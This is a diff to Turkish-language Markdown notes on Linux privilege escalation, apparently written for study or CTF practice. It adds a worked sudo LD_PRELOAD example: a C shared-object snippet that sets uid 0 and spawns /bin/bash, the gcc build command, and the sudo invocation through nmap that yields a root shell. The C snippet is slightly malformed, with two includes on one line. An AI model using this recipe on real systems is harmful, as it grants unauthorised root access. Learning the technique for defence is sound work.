@@ -60,9 +60,35 @@ sudo -l
 ```
 Çıktıda LD_PRELOAD ortam değişkeni varsa bunu aşağıda sudo yetkileri ile kullanabiliriz 
 
-![image](https://github.com/user-attachments/assets/697839cf-1b9a-45f0-99ec-bb563e0dd90c)
+mesela çıktıda :
+```bash
+env_keep+=LD_PRELOAD 
+(root) NOPASSWD: /usr/bin/nmap 
+```
+bunu bulursak 
+bir dosya içine aşağıdaki yada kendi shelimiz ne ise onu kullanabiliriz örn:
 
+``` c++
+#include <sys/types.h> #include <stdlib.h>
+void _init() { unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0); system("/bin/bash");
+}
+#include <stdio.h>
+```
+shell.c olarak kaydettik 
 
+```bash
+gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles 
+# daha sonra
+sudo LD_PRELOAD=/tmp/shell.so nmap
+```
+burası bizi root'a götürücek 
+ 
+```bash
+whoami
+#root
+```
 
 Hedef sistem, kullanıcıların bazı (veya tüm) komutları kök ayrıcalıklarıyla çalıştırmasına izin verecek şekilde yapılandırılabilir. sudo -l Komut, kullanıcınızın . kullanarak çalıştırabileceği tüm komutları listelemek için kullanılabilir sudo.
 
